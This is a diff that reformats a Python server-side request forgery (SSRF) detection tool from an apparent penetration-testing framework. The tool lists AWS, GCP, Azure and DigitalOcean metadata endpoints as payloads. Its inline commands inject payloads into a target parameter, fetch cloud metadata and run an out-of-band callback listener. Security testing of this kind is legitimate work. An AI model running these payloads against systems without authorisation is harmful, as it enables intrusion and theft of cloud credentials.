@@ -1,4 +1,5 @@
 """SSRF detection tool — payload injection, callback server, cloud metadata checks."""
+
 from __future__ import annotations
 
 import json
@@ -11,10 +12,10 @@ logger = logging.getLogger(__name__)
 
 # Common SSRF payloads for cloud metadata endpoints
 _CLOUD_METADATA_URLS = [
-    "http://169.254.169.254/latest/meta-data/",           # AWS
-    "http://169.254.169.254/metadata/v1/",                 # DigitalOcean
-    "http://metadata.google.internal/computeMetadata/v1/", # GCP
-    "http://169.254.169.254/metadata/instance",            # Azure
+    "http://169.254.169.254/latest/meta-data/",  # AWS
+    "http://169.254.169.254/metadata/v1/",  # DigitalOcean
+    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+    "http://169.254.169.254/metadata/instance",  # Azure
 ]
 
 _SSRF_BYPASS_PAYLOADS = [
@@ -41,7 +42,8 @@ class SsrfDetectTool(BasePentestTool):
     ACTIONS: dict[str, dict[str, Any]] = {
         "ssrf_basic": {
             "cmd": [
-                "python3", "-c",
+                "python3",
+                "-c",
                 "import requests,json,sys; "
                 "payloads={payloads}; results=[]; "
                 "[results.append({{'payload':p,'status':r.status_code,'length':len(r.text),'snippet':r.text[:200]}}) "
@@ -53,7 +55,8 @@ class SsrfDetectTool(BasePentestTool):
         },
         "ssrf_cloud_meta": {
             "cmd": [
-                "python3", "-c",
+                "python3",
+                "-c",
                 "import requests,json; "
                 "urls={cloud_urls}; results=[]; "
                 "[results.append({{'url':u,'status':r.status_code,'body':r.text[:500]}}) "
@@ -65,7 +68,8 @@ class SsrfDetectTool(BasePentestTool):
         },
         "ssrf_callback": {
             "cmd": [
-                "python3", "-c",
+                "python3",
+                "-c",
                 "import http.server,threading,time,json,requests; "
                 "hits=[]; "
                 "class H(http.server.BaseHTTPRequestHandler):\n"
@@ -111,9 +115,13 @@ class SsrfDetectTool(BasePentestTool):
         cloud_urls = json.dumps(_CLOUD_METADATA_URLS)
         cmd = [
             c.format(
-                url=url, inject_param=inject_param, payloads=payloads,
-                cloud_urls=cloud_urls, callback_host=callback_host,
-                callback_port=callback_port, wait_seconds=wait_seconds,
+                url=url,
+                inject_param=inject_param,
+                payloads=payloads,
+                cloud_urls=cloud_urls,
+                callback_host=callback_host,
+                callback_port=callback_port,
+                wait_seconds=wait_seconds,
             )
             for c in spec["cmd"]
         ]
@@ -134,8 +142,11 @@ class SsrfDetectTool(BasePentestTool):
         else:
             full_urls = base_payloads
 
-        return json.dumps({
-            "payloads": base_payloads,
-            "full_urls": full_urls[:20],
-            "note": "Test each payload against URL parameters that accept URLs, file paths, or redirects",
-        }, indent=2)
+        return json.dumps(
+            {
+                "payloads": base_payloads,
+                "full_urls": full_urls[:20],
+                "note": "Test each payload against URL parameters that accept URLs, file paths, or redirects",
+            },
+            indent=2,
+        )
